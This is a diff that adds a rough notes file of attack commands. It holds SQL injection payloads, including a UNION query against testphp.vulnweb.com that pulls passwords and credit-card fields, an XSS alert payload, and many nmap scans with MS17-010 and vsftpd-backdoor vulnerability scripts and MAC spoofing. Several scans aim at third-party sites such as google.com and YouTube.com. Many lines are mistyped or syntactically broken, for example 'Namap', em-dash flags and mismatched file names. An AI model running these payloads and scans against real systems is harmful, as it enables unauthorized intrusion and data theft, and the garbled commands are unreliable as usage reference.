@@ -1,0 +1,68 @@
+admin' OR '1'='1 
+
+testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test'
+
+<script>alert('XSS');</script>
+
+Apt install map
+Sudo su
+
+nmap —help
+Nmap google.com
+nmap -v -p 192.168.1.1/24
+Nmap 80,443-450 192.168.1.1
+Nmap -v —top 100
+-v -p http
+-v -p http*
+Nmap 192.168.1.1-5
+Nmap —trace amazon
+Nmap -O YouTube.com
+Nano input.txt
+Nmap -iL  input.txt
+Namap -sS -p 80,443
+-sT
+-sV
+Nmap —script vuln 192.168.1.1
+
+
+
+Nano iplist.txt
+Cat uplift.txt 
+Map —script vulnerability -sV 192.168.1.1
+Sub -domain: Nmap —script dns-brute google.com
+—script http-headers
+—script http-enum
+Sudo nmap -PE -sn scanme.nmap.org
+Sudo nmap -sV -iLiplist.txt 
+Nmap -PA80 -sn escame.nmap.org
+Nano iplist.txt
+Cat uplift.txt 
+Nmap -iL uplift.txt
+
+
+
+route
+ifconfig
+nmap -PR -sn 192.168.1.1/24
+nano iplist.txt
+sudo nmap  -PE -sn scanme.nmap.org
+nmap -PA80 -sn scanme.nmap.org
+nmap 192.168.1.1
+nmap -iL iplist.txt
+nmap -p 22 -iL iplist.txt
+sudo nmap -sA -iL iplist.txt
+sudo nmap -sU -iL iplist.txt
+sudo nmap -sV -iL iplist.txt
+sudo nmap -O iL iplist.txt
+nmap scanme.nmap.org -T5
+sudo nmap 192.168.1.1 --spoof -mac 0
+
+cd /usr/share/nmap
+cd scripts
+// SMB vulnerability 
+sudo nmap -iL iplist.txt -- script smb-vuln-ms17-010.nse
+//FTP vulnerability 
+sudo nmap --iL iplist.txt --script ftp-vsftpd-backdoor -p 21
+//VULN Vulnerability 
+
+nmap -iL iplist.txt --script vuln
